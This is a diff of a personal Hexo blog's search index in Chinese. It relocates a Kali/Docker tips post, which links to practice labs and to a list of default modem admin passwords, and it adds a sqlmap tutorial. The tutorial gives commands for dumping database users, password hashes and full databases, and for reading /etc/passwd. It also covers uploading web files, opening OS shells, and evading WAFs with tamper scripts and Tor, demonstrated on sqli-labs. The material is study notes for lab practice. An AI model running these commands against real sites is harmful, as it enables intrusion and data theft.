@@ -975,61 +975,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux/kali/docker</title>
-    <url>/2022/08/31/Linux-kali-docker/</url>
-    <content><![CDATA[<center>Linux/kali/docker环境部署/使用/问题</center>
-
-<span id="more"></span>
-
-<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p><a href="https://blog.csdn.net/yyf960126/article/details/80908823">查看端口占用</a></p>
-<p><a href="https://blog.csdn.net/qq_19446965/article/details/118586678">su 鉴定故障解决办法</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://blog.csdn.net/a1809032425/article/details/122729307">Linux下切换Python版本的几种方法</a></p>
-<p><a href="https://www.jianshu.com/p/20f2186d9cbb">Linux 换源方法</a></p>
-<p><a href="https://blog.csdn.net/weixin_34910922/article/details/116610670">apt-get install的默认安装路径</a></p>
-<h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><h2 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h2><p><a href="https://www.iculture.cc/cybersecurity/pig=205">kali安装burpsuite pro v1.7.37</a></p>
-<p><a href="https://www.cnblogs.com/z9m8r8/p/15140805.html">kali安装burpsuite</a></p>
-<p><a href="https://blog.csdn.net/weixin_61835841/article/details/124383328">kali安装burpsuite专业版</a></p>
-<p><a href="https://blog.csdn.net/qq_53079406/article/details/123952809">burpsuite安装可能遇到的问题</a></p>
-<p><a href="https://cloud.tencent.com/developer/ask/sof/295378">错误:选项-Xbootclasspath&#x2F;p</a></p>
-<p><a href="https://blog.csdn.net/weixin_43601010/article/details/125514325">Burp Suite 自带浏览器沙盒sandbox问题的解决</a></p>
-<h2 id="java-x2F-python"><a href="#java-x2F-python" class="headerlink" title="java&#x2F;python"></a>java&#x2F;python</h2><p><a href="https://blog.csdn.net/qq_34965596/article/details/117049617">切换java&#x2F;python版本</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --config java</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --config python</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://blog.csdn.net/m0_56641407/article/details/123456673">kali 卸载原装Openjdk11 并安装Oraclejdk11</a></p>
-<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><p><a href="https://blog.csdn.net/weixin_46017292/article/details/122532482">Docker安装AWVS</a></p>
-<p><a href="https://www.pudn.com/news/6228d5a59ddf223e1ad1e469.html">Docker更新nessus</a></p>
-<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p><a href="https://www.cnblogs.com/kkdaj/p/16260681.html">Navicat Premium 16</a></p>
-<p><a href="https://www.likecs.com/show-203417046.html">VMware虚拟机端口映射（NAT设置）</a></p>
-<p><a href="https://blog.csdn.net/xuchaoxin1375/article/details/112004456">vmware关闭侧通道缓解(windows端)</a></p>
-<p><a href="https://blog.csdn.net/weixin_46827107/article/details/114038896">换行与回车的区别</a></p>
-<blockquote>
-<p>回车可以写成CR，即Carriage Return，\r</p>
-<p>换行可以写成LF，即Line Feed，\n</p>
-<p>回车是把光标移到开始，换行是跳到下一行</p>
-</blockquote>
-<h1 id="Browser"><a href="#Browser" class="headerlink" title="Browser"></a>Browser</h1><p>base64编码解码：btoa()  atob()</p>
-<p>url编码解码：escape()  unescape()</p>
-<h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><p><a href="https://blog.csdn.net/studyvcmfc/article/details/123482104">ubuntu18.04在终端安装pip3时404 Not Found</a></p>
-<p><a href="https://blog.csdn.net/weixin_45043549/article/details/104371704">安装出现:Requirement already satisfied 的解决办法</a></p>
-<p><a href="https://blog.csdn.net/qq_35104586/article/details/107441178">pip 命令和参数整理</a></p>
-<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p><a href="https://blog.csdn.net/qq_52671379/article/details/123905705">upload-labs</a></p>
-<p><a href="https://www.likecs.com/show-415281.html">pikachu</a></p>
-<p><a href="https://blog.csdn.net/weixin_52501704/article/details/123590785">xss-platform平台的入门搭建</a></p>
-<p><a href="https://ranjuan.cn/xss-platform-test/">XSS测试平台xss-platform搭建</a></p>
-<p><a href="https://blog.csdn.net/Flamingo1998/article/details/125199522">DVWA靶场环境搭建</a></p>
-<p><a href="https://blog.csdn.net/weixin_45744814/article/details/120185420">vulhub</a></p>
-<p><a href="https://www.freebuf.com/sectool/165062.html">分享一个好用的漏洞环境：Vulhub</a></p>
-<h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1><p><a href="http://www.360doc.com/content/20/0312/03/7563309_898550725.shtml">中国移动光猫超级管理员账号密码汇总</a></p>
-]]></content>
-      <tags>
-        <tag>tips</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Genshin</title>
     <url>/2022/09/01/Genshin/</url>
     <content><![CDATA[<center>woc，原</center>
@@ -1653,6 +1598,61 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux/kali/docker</title>
+    <url>/2022/08/31/Linux-kali-docker/</url>
+    <content><![CDATA[<center>Linux/kali/docker环境部署/使用/问题</center>
+
+<span id="more"></span>
+
+<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p><a href="https://blog.csdn.net/yyf960126/article/details/80908823">查看端口占用</a></p>
+<p><a href="https://blog.csdn.net/qq_19446965/article/details/118586678">su 鉴定故障解决办法</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/a1809032425/article/details/122729307">Linux下切换Python版本的几种方法</a></p>
+<p><a href="https://www.jianshu.com/p/20f2186d9cbb">Linux 换源方法</a></p>
+<p><a href="https://blog.csdn.net/weixin_34910922/article/details/116610670">apt-get install的默认安装路径</a></p>
+<h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><h2 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h2><p><a href="https://www.iculture.cc/cybersecurity/pig=205">kali安装burpsuite pro v1.7.37</a></p>
+<p><a href="https://www.cnblogs.com/z9m8r8/p/15140805.html">kali安装burpsuite</a></p>
+<p><a href="https://blog.csdn.net/weixin_61835841/article/details/124383328">kali安装burpsuite专业版</a></p>
+<p><a href="https://blog.csdn.net/qq_53079406/article/details/123952809">burpsuite安装可能遇到的问题</a></p>
+<p><a href="https://cloud.tencent.com/developer/ask/sof/295378">错误:选项-Xbootclasspath&#x2F;p</a></p>
+<p><a href="https://blog.csdn.net/weixin_43601010/article/details/125514325">Burp Suite 自带浏览器沙盒sandbox问题的解决</a></p>
+<h2 id="java-x2F-python"><a href="#java-x2F-python" class="headerlink" title="java&#x2F;python"></a>java&#x2F;python</h2><p><a href="https://blog.csdn.net/qq_34965596/article/details/117049617">切换java&#x2F;python版本</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --config java</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --config python</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/m0_56641407/article/details/123456673">kali 卸载原装Openjdk11 并安装Oraclejdk11</a></p>
+<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><p><a href="https://blog.csdn.net/weixin_46017292/article/details/122532482">Docker安装AWVS</a></p>
+<p><a href="https://www.pudn.com/news/6228d5a59ddf223e1ad1e469.html">Docker更新nessus</a></p>
+<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p><a href="https://www.cnblogs.com/kkdaj/p/16260681.html">Navicat Premium 16</a></p>
+<p><a href="https://www.likecs.com/show-203417046.html">VMware虚拟机端口映射（NAT设置）</a></p>
+<p><a href="https://blog.csdn.net/xuchaoxin1375/article/details/112004456">vmware关闭侧通道缓解(windows端)</a></p>
+<p><a href="https://blog.csdn.net/weixin_46827107/article/details/114038896">换行与回车的区别</a></p>
+<blockquote>
+<p>回车可以写成CR，即Carriage Return，\r</p>
+<p>换行可以写成LF，即Line Feed，\n</p>
+<p>回车是把光标移到开始，换行是跳到下一行</p>
+</blockquote>
+<h1 id="Browser"><a href="#Browser" class="headerlink" title="Browser"></a>Browser</h1><p>base64编码解码：btoa()  atob()</p>
+<p>url编码解码：escape()  unescape()</p>
+<h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><p><a href="https://blog.csdn.net/studyvcmfc/article/details/123482104">ubuntu18.04在终端安装pip3时404 Not Found</a></p>
+<p><a href="https://blog.csdn.net/weixin_45043549/article/details/104371704">安装出现:Requirement already satisfied 的解决办法</a></p>
+<p><a href="https://blog.csdn.net/qq_35104586/article/details/107441178">pip 命令和参数整理</a></p>
+<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p><a href="https://blog.csdn.net/qq_52671379/article/details/123905705">upload-labs</a></p>
+<p><a href="https://www.likecs.com/show-415281.html">pikachu</a></p>
+<p><a href="https://blog.csdn.net/weixin_52501704/article/details/123590785">xss-platform平台的入门搭建</a></p>
+<p><a href="https://ranjuan.cn/xss-platform-test/">XSS测试平台xss-platform搭建</a></p>
+<p><a href="https://blog.csdn.net/Flamingo1998/article/details/125199522">DVWA靶场环境搭建</a></p>
+<p><a href="https://blog.csdn.net/weixin_45744814/article/details/120185420">vulhub</a></p>
+<p><a href="https://www.freebuf.com/sectool/165062.html">分享一个好用的漏洞环境：Vulhub</a></p>
+<h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1><p><a href="http://www.360doc.com/content/20/0312/03/7563309_898550725.shtml">中国移动光猫超级管理员账号密码汇总</a></p>
+]]></content>
+      <tags>
+        <tag>tips</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>如何用HEXO框架搭建博客</title>
     <url>/2022/08/30/%E5%A6%82%E4%BD%95%E7%94%A8HEXO%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
     <content><![CDATA[<center>搭个博客先</center>
@@ -1817,6 +1817,156 @@
 <p>访问<code>/index.php</code>会重定向到<code>1/php</code>，此时使用burpsuite抓包</p>
 <p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221018145058818.png" alt="image-20221018145058818"></p>
 <p>可以得到flag</p>
+<h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p><code>Sqlmap</code>是一个开源的渗透测试工具，可以用来自动化的检测、利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
+<p>目前支持的数据库有<code>MySQL</code>、<code>Oracle</code>、<code>PostgreSQL</code>、<code>Microsoft SQL Server</code>、<code>Microsoft Access</code>等数据库。</p>
+<p>sqlmap的注入方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于布尔类型的盲注：根据返回页面内容判断条件真假的注入。</span><br><span class="line">基于时间的盲注：无法根据页面返回的内容判断任何信息，需要用条件语句查看时间延迟语句是否执行(即页面返回时间是否增加)来判断。</span><br><span class="line">基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</span><br><span class="line">联合查询注入：在可以使用Union的情况下的注入。</span><br><span class="line">堆查询注入：可以同时执行多条语句时的注入。</span><br><span class="line">带外注入：构造SQL语句，这些语句在呈现给数据库时会触发数据库系统创建与攻击者控制的外部服务器的连接。以这种方式，攻击者可以收集数据或可能控制数据库的行为。</span><br></pre></td></tr></table></figure>
+
+<h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p>在<a href="https://sqlmap.org/">sqlmap的官网</a>可以下载软件包，需要运行在python环境中。</p>
+<p><code>Kali linux</code>系统自带<code>sqlmap</code>；如果没有，可以用<code>sudo apt-get install sqlmap</code>安装</p>
+<h2 id="使用及示例"><a href="#使用及示例" class="headerlink" title="使用及示例"></a>使用及示例</h2><h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p><strong>当网站不需要登录时</strong>，通过<code>-u</code>来判断是否存在注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u url/?id=1</span><br><span class="line">当注入点后面的参数大于等于两个时，需要加双引号</span><br><span class="line">sqlmap -u &quot;url/?id=1&amp;uid=2&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101102419006.png" alt="image-20221101102419006"></p>
+<p>这里能看出该数据库可能为Mysql数据库，版本≥5.0.12，且存在基于时间的SQL盲注</p>
+<p>输入<code>y</code>继续，可以使用<code>--batch</code>参数选择默认选项执行</p>
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101103204798.png" alt="image-20221101103204798"></p>
+<p>显示<code>id</code>参数为注入点，存在联合注入</p>
+<p>输入<code>y</code>d等待扫描完成后，会显示相关验证的payload</p>
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101103542751.png" alt="image-20221101103542751"></p>
+<p>并且给出扫描结果</p>
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101103649709.png" alt="image-20221101103649709"></p>
+<p>可以看到相关配置信息</p>
+<p><strong>当网站需要登录时</strong>，需要指定cookie才能进行注入（cookie需要在登录后获取）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/?id=1&quot; --cookie=&quot;cookie&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>当网站使用POST传递数据时</strong>，需要指定<code>data</code>参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --data=&quot;user=admin&amp;passwd=admin&amp;submit=Submit&quot;</span><br></pre></td></tr></table></figure>
+
+<p>也可以通过抓取请求数据包保存为文件后，使用<code>-r</code>参数进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看数据库信息"><a href="#查看数据库信息" class="headerlink" title="查看数据库信息"></a>查看数据库信息</h3><p><strong>查看数据库版本信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/?id=1&quot; --banner</span><br><span class="line">sqlmap -u &quot;url/?id=1&quot; -b</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101150621859.png" alt="image-20221101150621859"></p>
+<p><strong>查看数据库中所有的用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/?id=1&quot; --users</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101104604852.png" alt="image-20221101104604852"></p>
+<p><strong>查看数据库所有用户名的密码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx/Less-1/?id=1&quot; --passwords</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101104920987.png" alt="image-20221101104920987"></p>
+<p><strong>查看数据库当前用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx/Less-1/?id=1&quot; --current-user </span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101104807448.png" alt="image-20221101104807448"></p>
+<p><strong>判断当前用户是否有管理权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx/Less-1/?id=1&quot; --is-dba</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101105115437.png" alt="image-20221101105115437"></p>
+<p><strong>列出数据库管理员角色</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/?id=1&quot; --roles</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101110430383.png" alt="image-20221101110430383"></p>
+<p><strong>查看所有的数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101110529537.png" alt="image-20221101110529537"></p>
+<p><strong>查看当前的数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/?id=1&quot; --current-db</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101110609502.png" alt="image-20221101110609502"></p>
+<p><strong>爆出指定数据库中的所有的表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/?id=1&quot; -D cyber --tables</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101110736638.png" alt="image-20221101110736638"></p>
+<p><strong>爆出指定数据库指定表中的所有的列</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/?id=1&quot; -D cyber -T cyber --columns</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101110944541.png" alt="image-20221101110944541"></p>
+<p><strong>爆出指定数据库指定表指定列下的数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/?id=1&quot; -D cyber -T cyber -C user --dump</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101111032652.png" alt="image-20221101111032652"></p>
+<p><strong>爆出该网站数据库中的所有数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/?id=1&quot; -D cyber -T cyber --dump-all #爆出数据库security中的users表中的所有数据</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;url/?id=1&quot; -D cyber --dump-all   #爆出数据库security中的所有数据</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;url/?id=1&quot; --dump-all  #爆出该数据库中的所有数据</span><br></pre></td></tr></table></figure>
+
+<p>示例1</p>
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101111144223.png" alt="image-20221101111144223"></p>
+<h3 id="其它操作"><a href="#其它操作" class="headerlink" title="其它操作"></a>其它操作</h3><p><strong>探测等级和危险等级(–level –risk)</strong></p>
+<p><code>Sqlmap有5个探测等级</code>，默认为1。等级越高，说明探测时使用的payload也越多。其中5级的payload最多，会自动破解出cookie、XFF等头部注入。</p>
+<p>当然，等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie在level为2时就会测试，HTTP User-Agent&#x2F;Referer头在level为3时就会测试。在不确定哪个参数为注入点时，为了保证准确性，建议设置level为5</p>
+<p><code>sqlmap有3个危险等级</code>，默认为1。等级1在大多数情况下对测试目标无害。 等级2增加了基于时间的注入测试，等级3增加了OR测试。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/Less-1/&quot; --level=5 --risk=3  </span><br></pre></td></tr></table></figure>
+
+<p><strong>伪造Http Referer头部(–referer)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/Less-1/&quot; --referer  http://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行指定的SQL语句(–sql-shell  –sql-query)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/?id=1&quot; --sql-shell </span><br><span class="line">sqlmap -u &quot;url/?id=1&quot; --sql-query &quot;select user from cyber&quot; </span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101113121673.png" alt="image-20221101113121673"></p>
+<p><strong>执行操作系统命令(–os-cmd  –os-shell)</strong></p>
+<p>当数据库为MySQL、PostgreSql或者SQL Server时，可以执行操作系统命令</p>
+<p>当为MySQL数据库时，需满足下面条件：</p>
+<p>1.当前用户为 root<br>2.知道网站根目录的绝对路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url/Less-1/?id=1&quot; --os-cmd=whoami</span><br><span class="line">sqlmap -u &quot;url/Less-1/?id=1&quot; --os-shell</span><br></pre></td></tr></table></figure>
+
+<p>选择网站脚本类型</p>
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101113316080.png" alt="image-20221101113316080"></p>
+<p>选择可写目录（根目录）</p>
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101113431328.png" alt="image-20221101113431328"></p>
+<p>但是示例都不可写，如果可以写入的话</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--os-cmd会执行命令</span><br><span class="line">--os-shell会在网站根目录上传两个文件：tmpbxbxz.php、tmpuoiuz.php(上传页面)</span><br></pre></td></tr></table></figure>
+
+<p><strong>读取服务器文件(–file-read)</strong></p>
+<p>当数据库为MySQL、PostgreSQL或SQL Server，并且当前用户有权限时，可以读取指定文件，可以是文本文件或者二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx/sqli/Less-4/?id=1&quot; --file-read &quot;/etc/paswd&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101114224810.png" alt="image-20221101114224810"></p>
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101114258737.png" alt="image-20221101114258737"></p>
+<p><strong>上传文件到数据库服务器中(–file-write –file-dest)</strong></p>
+<p>当数据库为MySQL、Postgre SQL或者Sql Server(通过powershell写入)，并且当前用户有权限向任意目录写文件的时候，可以上传文件到数据库服务器。文件可以是文本，也可以是二进制文件。</p>
+<p>需要知道绝对路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://xxx/sqli-labs/Less-2/?id=1 </span><br><span class="line">--file-write D:\1.php </span><br><span class="line">--file-dest &quot;/var/WWW/html/2.php&quot;  </span><br><span class="line">#将本地的1.php文件上传到目标服务器</span><br></pre></td></tr></table></figure>
+
+<p><strong>输出级别(-v)</strong></p>
+<p>使用 Sqlmap 对一个注入点进行测试时，可以使用 <code>-v x</code> 参数指定回显信息的复杂度，x范围为[0~6]，共有 7 个等级，默认为 1。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0：只显示python错误以及严重的信息。</span><br><span class="line">1：同时显示基本信息和警告信息。（默认）</span><br><span class="line">2：同时显示debug信息。</span><br><span class="line">3：同时显示注入的payload。</span><br><span class="line">4：同时显示HTTP请求。</span><br><span class="line">5：同时显示HTTP响应头。</span><br><span class="line">6：同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h3><p>Sqlmap在默认情况下除了适用CHAR()函数防止出现单引号，没有对注入的数据进行修改。我们可以使用<code>--tamper</code>参数对数据进行修改来绕过WAF等设备，其中的大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则。</p>
+<p><strong>SQL参数绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--random-agent    使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候</span><br><span class="line">--time-sec=3      使用长的延时来避免触发WAF的机制，这方式比较耗时</span><br><span class="line">--hpp             使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上</span><br><span class="line">--proxy=100.100.100.100:8080 --proxy-cred=211:985      使用代理进行绕过</span><br><span class="line">--ignore-proxy    禁止使用系统的代理，直接连接进行注入</span><br><span class="line">--flush-session   清空会话，重构注入</span><br><span class="line">--hex 或者 --no-cast     进行字符码转换</span><br><span class="line">--mobile          对移动端的服务器进行注入</span><br><span class="line">--tor             匿名注入</span><br></pre></td></tr></table></figure>
+
+<p><strong>指定脚本进行绕过(–tamper)</strong></p>
+<p>有些时候网站会过滤掉各种字符，可以用<code>--tamper</code>来解决（对付某些waf时也有成效）</p>
+<p>sqlmap 官方提供了53个绕过脚本，脚本目录在<code>/usr/share/sqlmap/tamper</code>中</p>
+<p>部分脚本如下:</p>
+<p><img data-src="/../images/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%99%E7%A8%8B/image-20221101150009368.png" alt="image-20221101150009368"></p>
+<p><strong>指定单个脚本绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx/Less-1/?id=1&quot; --tamper=space2plus.py </span><br></pre></td></tr></table></figure>
+
+<p><strong>指定多个脚本绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx/Less-1/?id=1&quot; --tamper=&quot;space2comment.py,space2plus.py&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="更多参数"><a href="#更多参数" class="headerlink" title="更多参数"></a>更多参数</h3><p><strong>查看元数据库(–schema)</strong></p>
+<p><strong>连接数据库服务器(-d)</strong></p>
+<p>直接连接数据库服务器，作为数据库客户端使用而不是通过SQL注入漏洞查询进行，查询速度较快，前提是已知数据库当前的用户名及其密码、IP、端口和数据库名称</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -d “mysql://user:password@10.10.10.137:3306/dvwa” -f --users</span><br></pre></td></tr></table></figure>
+
+<p><strong>扫描多个URL文件(-m)</strong></p>
+<p>sqlmap -m urllist.txt –users</p>
+<p><strong>扫描HTTPS网站(–force-ssl)</strong></p>
+<p><strong>变量分隔符(–param-del)</strong></p>
+<p>默认情况下参数变量的分隔符为&amp;，若为其他符号时要使用变量分隔符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --data=&quot;username=1;password=2&quot; --param-del=&quot;;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看指纹信息(-f)</strong></p>
+<p><strong>采用多线程(–threads n)</strong></p>
+<p><strong>反弹shell(–os-pwn)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--os-pwn --msf-path=/opt/framework/msf3/</span><br><span class="line"></span><br><span class="line">--msf-path= #matesploit绝对路径</span><br></pre></td></tr></table></figure>
 ]]></content>
       <tags>
         <tag>study</tag>
